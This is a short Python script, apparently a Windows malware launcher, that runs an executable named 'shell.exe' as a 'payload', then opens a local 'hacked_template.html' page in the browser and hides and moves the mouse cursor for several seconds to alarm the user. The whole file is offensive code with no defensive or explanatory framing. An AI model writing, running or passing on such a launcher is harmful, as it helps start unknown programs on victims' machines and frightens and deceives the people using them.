import subprocess
import os
import webbrowser
import ctypes
import time

def launch_payload():
    try:
        subprocess.Popen("shell.exe", shell=True)
    except Exception as e:
        print("Payload failed to launch:", e)

def full_screen_alert(file_path):
    webbrowser.open(f"file:///{file_path}")
    try:
        ctypes.windll.user32.SetCursorPos(0, 0)
        ctypes.windll.user32.ShowCursor(False)
        time.sleep(5)
        ctypes.windll.user32.ShowCursor(True)
    except:
        pass

def main():
    launch_payload()
    html_path = os.path.abspath("hacked_template.html")
    time.sleep(2)
    full_screen_alert(html_path)

if __name__ == "__main__":
    main()
